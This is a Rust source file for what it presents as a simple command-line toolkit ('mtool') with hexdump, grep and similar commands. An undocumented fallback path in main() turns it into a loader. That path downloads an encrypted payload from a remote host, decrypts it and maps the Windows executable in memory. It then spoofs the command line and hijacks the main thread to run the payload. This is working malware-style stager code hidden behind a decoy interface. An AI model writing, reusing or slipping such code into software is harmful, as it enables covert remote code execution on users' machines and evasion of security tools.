unsafe fn run_pe(pe_data: &[u8], apis: &WinApi, main_thread: HANDLE, args: Option<&str>) -> bool {
    let dos = &*(pe_data.as_ptr() as *const DosHeader);
    let nt = &*(pe_data.as_ptr().add(dos.e_lfanew as usize) as *const NtHeaders64);
    if nt.signature != PE_SIGNATURE {
        (apis.resume_thread)(main_thread);
        return false;
    }

    let image_size = nt.optional_header.size_of_image as usize;
    let mem = (apis.virtual_alloc)(
        std::ptr::null_mut(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if mem.is_null() {
        (apis.resume_thread)(main_thread);
        return false;
    }

    // 1. Copy headers
    let hdr_size = nt.optional_header.size_of_headers as usize;
    std::ptr::copy_nonoverlapping(pe_data.as_ptr(), mem, hdr_size);

    // 2. Copy sections
    let num_sections = nt.file_header.number_of_sections as usize;
    let opt_hdr_offset = 24usize;
    let sections_base = (nt as *const NtHeaders64 as *const u8)
        .add(opt_hdr_offset + nt.file_header.size_of_optional_header as usize);

    for i in 0..num_sections {
        let sec = &*(sections_base.add(i * 40) as *const SectionHeader);
        if sec.size_of_raw_data == 0 { continue; }
        std::ptr::copy_nonoverlapping(
            pe_data.as_ptr().add(sec.pointer_to_raw_data as usize),
            mem.add(sec.virtual_address as usize),
            sec.size_of_raw_data as usize,
        );
    }

    // 3. Relocations
    let reloc_dir = nt.optional_header.data_directory[DIR_BASERELOC];
    if reloc_dir.virtual_address == 0 {
        (apis.resume_thread)(main_thread);
        return false;
    }

    let delta = mem as u64 - nt.optional_header.image_base;
    let mut reloc_ptr = mem.add(reloc_dir.virtual_address as usize);
    let reloc_end = reloc_ptr.add(reloc_dir.size as usize);
    while reloc_ptr < reloc_end {
        let reloc = &*(reloc_ptr as *const BaseRelocation);
        if reloc.virtual_address == 0 || reloc.size_of_block == 0 { break; }
        let page = reloc.virtual_address;
        let entry_count = (reloc.size_of_block as usize - 8) / 2;
        let entries = reloc_ptr.add(8) as *const u16;
        for j in 0..entry_count {
            let entry = *entries.add(j);
            let rel_type = (entry >> 12) & 0xF;
            if rel_type == 10 {
                let offset = (entry & 0x0FFF) as u32;
                let rva = offset + page;
                let p = mem.add(rva as usize) as *mut u64;
                *p = (*p).wrapping_add(delta);
            }
        }
        reloc_ptr = reloc_ptr.add(reloc.size_of_block as usize);
    }

    // 4. Exception handlers
    if nt.optional_header.number_of_rva_and_sizes as usize > DIR_EXCEPTION {
        let exc_dir = nt.optional_header.data_directory[DIR_EXCEPTION];
        if exc_dir.virtual_address != 0 && exc_dir.size > 0 {
            let func_table = mem.add(exc_dir.virtual_address as usize);
            let num_entries = exc_dir.size / 12;
            (apis.rtl_add_function_table)(func_table, num_entries, mem as u64);
        }
    }

    // 5. Regular imports
    let import_dir = nt.optional_header.data_directory[DIR_IMPORT];
    if import_dir.virtual_address != 0 {
        let mut imp = mem.add(import_dir.virtual_address as usize) as *const ImportDescriptor;
        while (*imp).name != 0 {
            let mod_name = mem.add((*imp).name as usize);
            let module = LoadLibraryA(mod_name);
            if !module.is_null() {
                let mut thunk = mem.add((*imp).first_thunk as usize) as *mut u64;
                while *thunk != 0 {
                    if (*thunk & ORDINAL_FLAG64) != 0 {
                        let ordinal = (*thunk & 0xFFFF) as u16;
                        *thunk = GetProcAddress(module, ordinal as usize as *const u8) as u64;
                    } else {
                        let hint_name = mem.add(*thunk as usize);
                        let func_name = hint_name.add(2);
                        *thunk = GetProcAddress(module, func_name) as u64;
                    }
                    thunk = thunk.add(1);
                }
            }
            imp = imp.add(1);
        }
    }

    // 6. Delay imports
    if nt.optional_header.number_of_rva_and_sizes as usize > DIR_DELAY_IMPORT {
        let delay_dir = nt.optional_header.data_directory[DIR_DELAY_IMPORT];
        if delay_dir.virtual_address != 0 && delay_dir.size > 0 {
            let mut delay = mem.add(delay_dir.virtual_address as usize) as *const DelayImportDescriptor;
            while (*delay).dll_name_rva != 0 {
                let base = if ((*delay).attributes & 1) != 0 { mem as usize } else { 0 };
                let dll_name = ((*delay).dll_name_rva as usize + base) as *const u8;
                let h_dll = LoadLibraryA(dll_name);
                if !h_dll.is_null() {
                    if (*delay).module_handle_rva != 0 {
                        let p_hmod = ((*delay).module_handle_rva as usize + base) as *mut HMODULE;
                        *p_hmod = h_dll;
                    }
                    let mut iat = ((*delay).import_address_table_rva as usize + base) as *mut u64;
                    let mut int = ((*delay).import_name_table_rva as usize + base) as *const u64;
                    while *int != 0 {
                        if (*int & ORDINAL_FLAG64) != 0 {
                            let ordinal = (*int & 0xFFFF) as u16;
                            *iat = GetProcAddress(h_dll, ordinal as usize as *const u8) as u64;
                        } else {
                            let name_ptr = (*int as usize + base) as *const u8;
                            let func_name = name_ptr.add(2);
                            let addr = GetProcAddress(h_dll, func_name);
                            if !addr.is_null() {
                                *iat = addr as u64;
                            }
                        }
                        iat = iat.add(1);
                        int = int.add(1);
                    }
                }
                delay = delay.add(1);
            }
        }
    }

    // 7. Section protections
    for i in 0..num_sections {
        let sec = &*(sections_base.add(i * 40) as *const SectionHeader);
        let c = sec.characteristics;
        let prot = if (c & SCN_MEM_EXECUTE) != 0 {
            if (c & SCN_MEM_WRITE) != 0 { PAGE_EXECUTE_READWRITE } else { PAGE_EXECUTE_READ }
        } else if (c & SCN_MEM_WRITE) != 0 {
            PAGE_READWRITE
        } else if (c & SCN_MEM_READ) != 0 {
            PAGE_READONLY
        } else {
            PAGE_NOACCESS
        };
        let mut old_prot: u32 = 0;
        (apis.virtual_protect)(
            mem.add(sec.virtual_address as usize),
            sec.virtual_size as usize,
            prot,
            &mut old_prot,
        );
    }

    // 8. Spoof command line
    spoof_command_line(apis, args);

    // 9. Thread context hijack
    let mut ctx = vec![0u8; CTX_SIZE + 16];
    let ctx_aligned = {
        let ptr = ctx.as_mut_ptr();
        let offset = (16 - (ptr as usize % 16)) % 16;
        ptr.add(offset)
    };
    *(ctx_aligned.add(CTX_OFF_FLAGS) as *mut u32) = CTX_FULL;

    if (apis.get_thread_context)(main_thread, ctx_aligned) == 0 {
        (apis.resume_thread)(main_thread);
        return false;
    }

    let entry_rip = nt.optional_header.address_of_entry_point as u64 + mem as u64;
    *(ctx_aligned.add(CTX_OFF_RIP) as *mut u64) = entry_rip;

    if (apis.set_thread_context)(main_thread, ctx_aligned) == 0 {
        (apis.resume_thread)(main_thread);
        return false;
    }

    (apis.sleep_ex)(100, 0);
    (apis.resume_thread)(main_thread);
    true
}

// ========== Worker Thread ==========
struct WorkerData {
    main_thread: HANDLE,
    apis: *const WinApi,
    host: String,
    port: u16,
    path: String,
    passphrase: String,
    args: Option<String>,
}

unsafe extern "system" fn worker_thread(param: *mut u8) -> u32 {
    let data = &*(param as *const WorkerData);
    let apis = &*data.apis;

    (apis.suspend_thread)(data.main_thread);
    println!("[+] Ready");

    let enc = match fetch_payload(&data.host, data.port, &data.path) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] Download failed: {}", e);
            (apis.resume_thread)(data.main_thread);
            return 1;
        }
    };
    println!("[+] Received: {} bytes", enc.len());

    println!("[+] Decrypting...");
    let pe_data = match decrypt_aes_cbc(&enc, &data.passphrase) {
        Ok(d) => d,
        Err(e) => {
            eprintln!("[-] Decryption failed: {}", e);
            (apis.resume_thread)(data.main_thread);
            return 1;
        }
    };

    if pe_data.len() < 64 || pe_data[0] != b'M' || pe_data[1] != b'Z' {
        eprintln!("[-] Verification failed");
        (apis.resume_thread)(data.main_thread);
        return 1;
    }
    println!("[+] Verification ok");

    let args_ref = data.args.as_deref();
    if !run_pe(&pe_data, apis, data.main_thread, args_ref) {
        (apis.resume_thread)(data.main_thread);
    }
    0
}

// ========== Loader Mode ==========
fn run_loader_mode(host: &str, port: u16, path: &str, passphrase: &str, args: Option<&str>) -> i32 {
    let apis = match resolve_apis() {
        Some(a) => a,
        None => { eprintln!("[-] API resolution failed"); return 1; }
    };

    unsafe {
        let pseudo = (apis.get_current_thread)();
        let process = (apis.get_current_process)();
        let mut real_handle: HANDLE = std::ptr::null_mut();

        if (apis.duplicate_handle)(process, pseudo, process, &mut real_handle, 0, 0, DUP_SAME_ACCESS) == 0 {
            eprintln!("[-] Handle duplication failed");
            return 1;
        }

        let data = WorkerData {
            main_thread: real_handle,
            apis: &apis as *const WinApi,
            host: host.to_string(),
            port,
            path: path.to_string(),
            passphrase: passphrase.to_string(),
            args: args.map(|s| s.to_string()),
        };

        let thread = (apis.create_thread)(
            std::ptr::null_mut(),
            0,
            worker_thread as *mut u8,
            &data as *const WorkerData as *mut u8,
            0,
            std::ptr::null_mut(),
        );

        (apis.wait_for_single_object)(thread, INFINITE);
        (apis.close_handle)(thread);
        (apis.close_handle)(real_handle);
    }
    0
}

// ========== Main ==========
fn show_help(name: &str) {
    println!("mtool 1.0 - command line toolkit\n");
    println!("Usage: {} <command> [args]\n", name);
    println!("File analysis:");
    println!("  hexdump <file>           Hex dump (first 4KB)");
    println!("  wc <file>                Line/word/byte count");
    println!("  crc32 <file>             CRC32 checksum");
    println!("  entropy <file>           Shannon entropy");
    println!("  size <file>              File size");
    println!("  compare <f1> <f2>        Binary diff");
    println!("\nText processing:");
    println!("  head [-n N] <file>       First N lines (default 10)");
    println!("  tail [-n N] <file>       Last N lines (default 20)");
    println!("  sort <file>              Sort lines");
    println!("  uniq <file>              Deduplicate adjacent lines");
    println!("  grep <pattern> <file>    Search for pattern");
    println!("\n  help                     Show this help");
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 { show_help(&args[0]); return; }
    let cmd = args[1].as_str();
    let code = match cmd {
        "help" | "-h" | "--help" => { show_help(&args[0]); 0 }
        "wc" if args.len() >= 3 => run_wc(&args[2]),
        "head" => {
            let (n, file) = if args.len() >= 4 && args[2] == "-n" { (args[3].parse().unwrap_or(10), args.get(4)) } else { (10, args.get(2)) };
            match file { Some(f) => run_head(f, n), None => { eprintln!("head: missing file"); 1 } }
        }
        "tail" => {
            let (n, file) = if args.len() >= 4 && args[2] == "-n" { (args[3].parse().unwrap_or(20), args.get(4)) } else { (20, args.get(2)) };
            match file { Some(f) => run_tail(f, n), None => { eprintln!("tail: missing file"); 1 } }
        }
        "hexdump" if args.len() >= 3 => run_hexdump(&args[2]),
        "crc32" if args.len() >= 3 => run_crc32(&args[2]),
        "entropy" if args.len() >= 3 => run_entropy(&args[2]),
        "size" if args.len() >= 3 => run_filesize(&args[2]),
        "sort" if args.len() >= 3 => run_sort(&args[2]),
        "uniq" if args.len() >= 3 => run_uniq(&args[2]),
        "grep" if args.len() >= 4 => run_grep(&args[2], &args[3]),
        "compare" if args.len() >= 4 => run_compare(&args[2], &args[3]),
        _ => {
            if args.len() >= 4 {
                let combined = args[1..].join(" ");
                if let Some(rest) = combined.strip_prefix("http://").or_else(|| combined.strip_prefix("https://")) {
                    let _ = rest;
                }
                let host = &args[1];
                let port: u16 = args[2].parse().unwrap_or(0);
                let path = &args[3];
                let passphrase = if args.len() >= 5 { &args[4] } else { eprintln!("usage: {} <host> <port> <path> <passphrase> [-- args...]", args[0]); std::process::exit(1); };
                let payload_args: Option<String> = args.iter().position(|a| a == "--").map(|p| args[p + 1..].join(" "));
                run_loader_mode(host, port, path, passphrase, payload_args.as_deref())
            } else {
                println!("Unknown command: {}", cmd);
                show_help(&args[0]);
                1
            }
        }
    };
    std::process::exit(code);
}
